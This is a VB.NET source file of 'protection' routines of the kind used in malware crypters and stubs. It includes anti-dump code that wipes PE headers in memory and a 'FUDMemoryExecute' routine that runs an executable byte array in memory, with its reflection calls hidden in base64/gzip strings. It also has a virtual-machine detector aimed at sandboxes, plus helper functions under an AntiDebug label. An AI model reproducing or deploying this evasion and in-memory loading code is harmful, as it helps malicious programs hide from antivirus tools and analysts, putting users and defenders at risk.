Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Text
Imports System.Threading.Tasks
Imports System.Reflection.Emit
Imports System.Reflection
Imports System.IO.Compression
Imports System.Runtime.InteropServices

Namespace Protections

    Public Class AntiDump

#Region " Pinvoke's "

        <System.Runtime.InteropServices.DllImport("kernel32.dll")>
        Private Shared Function ZeroMemory(ByVal addr As IntPtr, ByVal size As IntPtr) As IntPtr
        End Function

        <System.Runtime.InteropServices.DllImport("kernel32.dll")>
        Private Shared Function VirtualProtect(ByVal lpAddress As IntPtr, ByVal dwSize As IntPtr, ByVal flNewProtect As IntPtr, ByRef lpflOldProtect As IntPtr) As IntPtr
        End Function

#End Region

#Region " Declare's "

        Private Shared sectiontabledwords As Integer() = New Integer() {&H8, &HC, &H10, &H14, &H18, &H1C, &H24}
        Private Shared peheaderbytes As Integer() = New Integer() {&H1A, &H1B}
        Private Shared peheaderwords As Integer() = New Integer() {&H4, &H16, &H18, &H40, &H42, &H44, &H46, &H48, &H4A, &H4C, &H5C, &H5E}
        Private Shared peheaderdwords As Integer() = New Integer() {&H0, &H8, &HC, &H10, &H16, &H1C, &H20, &H28, &H2C, &H34, &H3C, &H4C, &H50, &H54, &H58, &H60, &H64, &H68, &H6C, &H70, &H74, &H104, &H108, &H10C, &H110, &H114, &H11C}

#End Region

        Private Shared Sub EraseSection(ByVal address As IntPtr, ByVal size As Integer)
            Dim sz As IntPtr = CType(size, IntPtr)
            Dim dwOld As IntPtr = Nothing
            VirtualProtect(address, sz, CType(&H40, IntPtr), dwOld)
            ZeroMemory(address, sz)
            Dim temp As IntPtr = Nothing
            VirtualProtect(address, sz, dwOld, temp)
        End Sub

        Public Shared Sub StartProtection()
            Dim process = System.Diagnostics.Process.GetCurrentProcess()
            Dim base_address = process.MainModule.BaseAddress
            Dim dwpeheader = System.Runtime.InteropServices.Marshal.ReadInt32(CType((base_address.ToInt32() + &H3C), IntPtr))
            Dim wnumberofsections = System.Runtime.InteropServices.Marshal.ReadInt16(CType((base_address.ToInt32() + dwpeheader + &H6), IntPtr))
            EraseSection(base_address, 30)

            For i As Integer = 0 To peheaderdwords.Length - 1
                EraseSection(CType((base_address.ToInt32() + dwpeheader + peheaderdwords(i)), IntPtr), 4)
            Next

            For i As Integer = 0 To peheaderwords.Length - 1
                EraseSection(CType((base_address.ToInt32() + dwpeheader + peheaderwords(i)), IntPtr), 2)
            Next

            For i As Integer = 0 To peheaderbytes.Length - 1
                EraseSection(CType((base_address.ToInt32() + dwpeheader + peheaderbytes(i)), IntPtr), 1)
            Next

            Dim x As Integer = 0
            Dim y As Integer = 0

            While x <= wnumberofsections

                If y = 0 Then
                    EraseSection(CType(((base_address.ToInt32() + dwpeheader + &HFA + (&H28 * x)) + &H20), IntPtr), 2)
                End If

                EraseSection(CType(((base_address.ToInt32() + dwpeheader + &HFA + (&H28 * x)) + sectiontabledwords(y)), IntPtr), 4)
                y += 1

                If y = sectiontabledwords.Length Then
                    x += 1
                    y = 0
                End If
            End While
        End Sub

    End Class

    Public Class RunPE_ish

        Public Shared Sub FUDMemoryExecute(ByVal ExeByteArray As Byte())

            Dim dm = New DynamicMethod("Piratesucksshit", GetType(Object), New Type() {GetType(Byte())})
            Dim gen = dm.GetILGenerator()
            gen.DeclareLocal(GetType(Assembly))
            Dim method1 As MethodInfo = Type.GetType(DecompressString("GgAAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHK" & _
                                                                       "ZVZlXWYWQMztnbz33nvvvffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyJeXzdtvhi/" & _
                                                                       "ys/LfNoW1XJ83DT5YlJe/z8YT988GgAAAA==")).GetMethod(DecompressString("BAAAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHK" & _
                                                                                                                                          " ZVZlXWYWQMztnbz33nvvvffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyKeV9ns/wEj" & _
                                                                                                                                           "SzSFBAAAAA=="), BindingFlags.[Static] Or BindingFlags.[Public] Or BindingFlags.NonPublic, Nothing, New Type() {GetType(Byte())}, Nothing)
            gen.Emit(OpCodes.Ldarg_0)
            gen.Emit(OpCodes.[Call], method1)
            gen.Emit(OpCodes.Ret)


            Dim LAsm As Assembly = dm.Invoke(Nothing, New Object() {ExeByteArray}) '---PROGRAM BYTE ARRAY HERE!---


            Dim MetInf As MethodInfo = CallByName(LAsm, DecompressString("CgAAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHK" & _
                                                                    "ZVZlXWYWQMztnbz33nvvvffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyJOl219/bIq" & _
                                                                    "lu3/A/jXPsAKAAAA"), CallType.Method)

            Dim NObj As Object = CallByName(LAsm, DecompressString("DgAAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHK" & _
                                                              "ZVZlXWYWQMztnbz33nvvvffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyJO6jxr87Nl" & _
                                                              "02bLaf7/ACrdUiAOAAAA"), CallType.Method, New Object() {CallByName(MetInf, DecompressString("BAAAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHK" & _
                                                                                                                                                        "ZVZlXWYWQMztnbz33nvvvffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyJeZIv8/wE4" & _
                                                                                                                                                        "0RH+BAAAAA=="), CallType.Method)})
            CallByName(MetInf, DecompressString("BgAAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHK" & _
                                          "ZVZlXWYWQMztnbz33nvvvffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyLOlpfV2/z/" & _
                                          "Ac1nmQkGAAAA"), CallType.Method, New Object() {NObj, New Object() {New String() {Nothing}}})


        End Sub

        Private Shared Function DecompressString(ByVal compressedText As String) As String
            Dim gZipBuffer As Byte() = Convert.FromBase64String(compressedText)
            Using memoryStream = New IO.MemoryStream()
                Dim dataLength As Integer = BitConverter.ToInt32(gZipBuffer, 0)
                memoryStream.Write(gZipBuffer, 4, gZipBuffer.Length - 4)
                Dim buffer = New Byte(dataLength - 1) {}
                memoryStream.Position = 0
                Using gZipStream = New GZipStream(memoryStream, CompressionMode.Decompress)
                    gZipStream.Read(buffer, 0, buffer.Length)
                End Using
                Return Encoding.UTF8.GetString(buffer)
            End Using
        End Function

    End Class

    Public Class AntiDebug

#Region " Get Current APP Name Function "

        ' [ Get Current APP Name Function ]
        '
        ' // By Elektro H@cker
        '
        ' Examples :
        ' MsgBox(Get_Current_APP_Name())
        ' MsgBox(Get_Current_APP_Name(False))

        Public Shared Function Get_Current_APP_Name(Optional ByVal WithFileExtension As Boolean = True) As String
            Dim EXE_Filename As String = System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName

            If WithFileExtension Then : Return EXE_Filename
            Else : Return EXE_Filename.Substring(0, EXE_Filename.Length - 4)
            End If

        End Function

#End Region

#Region " Get Current APP Path Function "

        ' [ Get Current APP Path Function ]
        '
        ' // By Elektro H@cker
        '
        ' Examples :
        ' MsgBox(Get_Current_APP_Path())
        ' MsgBox(Get_Current_APP_Path(True))

        Private Function Get_Current_APP_Path(Optional ByVal FullPath As Boolean = False) As String
            If FullPath Then : Return CurDir() & "\" & System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName
            Else : Return CurDir()
            End If
        End Function

#End Region

#Region " Get Process Window Title Function "

        ' [ Get Process Window Title Function ]
        '
        ' // By Elektro H@cker
        '
        ' Examples :
        ' MsgBox(Get_Process_Window_Title("cmd"))
        ' MsgBox(Get_Process_Window_Title("cmd.exe"))

        Private Function Get_Process_Window_Title(ByVal ProcessName As String) As String
            If ProcessName.ToLower.EndsWith(".exe") Then ProcessName = ProcessName.Substring(0, ProcessName.Length - 4)
            Dim ProcessArray = Process.GetProcessesByName(ProcessName)
            If ProcessArray.Length = 0 Then Return Nothing Else Return ProcessArray(0).MainWindowTitle
        End Function

#End Region

    End Class

    Public Class AntiVM

#Region " Detect Virtual Machine "

        ' [ Detect Virtual Machine Function ]
        '
        ' // By Elektro H@cker
        '
        ' Instructions :
        ' 1. Add a reference for "System.Management"
        '
        ' Examples :
        ' MsgBox(Detect_Virtual_Machine)
        ' If Detect_Virtual_Machine() Then MsgBox("This program cannot run on a virtual machine")


        Public Shared Function Detect_Virtual_Machine() As Boolean

            Dim ModelName As String = Nothing
            Dim SearchQuery = New System.Management.ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive WHERE BytesPerSector > 0")

            For Each ManagementSystem In SearchQuery.Get

                ModelName = ManagementSystem("Model").ToString.Split(" ").First.ToLower

                If ModelName = "virtual" Or _
                   ModelName = "vmware" Or _
                   ModelName = "vbox" Or _
                   ModelName = "qemu" _
                Then
                    Return True ' Virtual machine HDD Model Name found
                End If

            Next

            Return False ' Virtual machine HDD Model Name not found

        End Function

#End Region

    End Class

    Public Class AntiDumpv2

        <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
        Public Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
        End Function

        <DllImport("kernel32", CharSet:=CharSet.Auto, SetLastError:=True)> _
        Public Shared Function VirtualProtectEx(ByVal hProcess As IntPtr, ByVal lpAddress As IntPtr, ByVal dwSize As IntPtr, ByVal flNewProtect As UInteger, ByRef lpflOldProtect As UInteger) As Boolean
        End Function

        <DllImport("kernel32.dll")>
        Private Shared Function VirtualProtect(ByVal lpAddress As IntPtr, ByVal dwSize As IntPtr, ByVal flNewProtect As IntPtr, ByRef lpflOldProtect As IntPtr) As IntPtr
        End Function

        <DllImport("kernel32.dll")> _
        Public Shared Sub ZeroMemory(ByVal addr As IntPtr, ByVal size As IntPtr)
        End Sub

        Private Shared sectiontabledwords As Integer() = New Integer() {&H8, &HC, &H10, &H14, &H18, &H1C, &H24}
        Private Shared peheaderbytes As Integer() = New Integer() {&H1A, &H1B}
        Private Shared peheaderwords As Integer() = New Integer() {&H4, &H16, &H18, &H40, &H42, &H44, &H46, &H48, &H4A, &H4C, &H5C, &H5E}
        Private Shared peheaderdwords As Integer() = New Integer() {&H0, &H8, &HC, &H10, &H16, &H1C, &H20, &H28, &H2C, &H34, &H3C, &H4C, &H50, &H54, &H58, &H60, &H64, &H68, &H6C, &H70, &H74, &H104, &H108, &H10C, &H110, &H114, &H11C}

        Private Shared Sub EraseSection(ByVal address As IntPtr, ByVal size As Integer)
            Dim sz As IntPtr = CType(size, IntPtr)
            Dim dwOld As IntPtr = Nothing
            VirtualProtect(address, sz, CType(&H40, IntPtr), dwOld)
            ZeroMemory(address, sz)
            Dim temp As IntPtr = Nothing
            VirtualProtect(address, sz, dwOld, temp)
        End Sub

        Public Shared Sub AntiDump()
            Dim process = System.Diagnostics.Process.GetCurrentProcess()
            Dim base_address = process.MainModule.BaseAddress
            Dim dwpeheader = Marshal.ReadInt32(CType((base_address.ToInt32() + &H3C), IntPtr))
            Dim wnumberofsections = Marshal.ReadInt16(CType((base_address.ToInt32() + dwpeheader + &H6), IntPtr))
            EraseSection(base_address, 30)

            For i As Integer = 0 To peheaderdwords.Length - 1
                EraseSection(CType((base_address.ToInt32() + dwpeheader + peheaderdwords(i)), IntPtr), 4)
            Next

            For i As Integer = 0 To peheaderwords.Length - 1
                EraseSection(CType((base_address.ToInt32() + dwpeheader + peheaderwords(i)), IntPtr), 2)
            Next

            For i As Integer = 0 To peheaderbytes.Length - 1
                EraseSection(CType((base_address.ToInt32() + dwpeheader + peheaderbytes(i)), IntPtr), 1)
            Next

            Dim x As Integer = 0
            Dim y As Integer = 0

            While x <= wnumberofsections

                If y = 0 Then
                    EraseSection(CType(((base_address.ToInt32() + dwpeheader + &HFA + (&H28 * x)) + &H20), IntPtr), 2)
                End If

                EraseSection(CType(((base_address.ToInt32() + dwpeheader + &HFA + (&H28 * x)) + sectiontabledwords(y)), IntPtr), 4)
                y += 1

                If y = sectiontabledwords.Length Then
                    x += 1
                    y = 0
                End If
            End While
        End Sub


    End Class

End Namespace
